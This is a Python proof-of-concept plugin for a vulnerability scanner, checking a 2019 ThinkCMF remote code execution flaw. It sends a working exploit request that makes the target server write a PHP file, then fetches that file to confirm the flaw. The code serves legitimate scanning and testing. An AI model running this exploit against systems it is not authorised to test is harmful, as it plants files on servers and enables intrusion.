#!/usr/bin/env python3
# @Time    : 2020-04-26
# @Author  : caicai
# @File    : poc_thinkcmf_rce_2019.py

from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.common import get_random_str
from myscan.config import scan_set


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "thinkcmf rce"
        self.vulmsg = "Thinkcmf任意内容包含远程代码执行,CNVD-C-2019-177930"
        self.level = 3  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        random_str1 = get_random_str(5)
        random_str2 = get_random_str(5)
        req = {
            "method": "GET",
            "url": self.url + "index.php?a=fetch&content=%3C?php+file_put_contents(%22{}.php%22,%22%3C?php+echo+{};%22);".format(
                random_str1, random_str2),
            "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers
            "timeout": 10,
            "verify": False,
            "allow_redirects":False

        }
        r = request(**req)
        if r != None and r.status_code == 200:
            req["url"] = self.url + "{}.php".format(random_str1)
            r1 = request(**req)
            if r1 != None and random_str2.encode() in r1.content:
                parser_ = response_parser(r1)
                self.result.append({
                    "name": self.name,
                    "url": parser_.geturl(),
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "request": parser_.getrequestraw(),
                        "response": parser_.getresponseraw()
                    }
                })
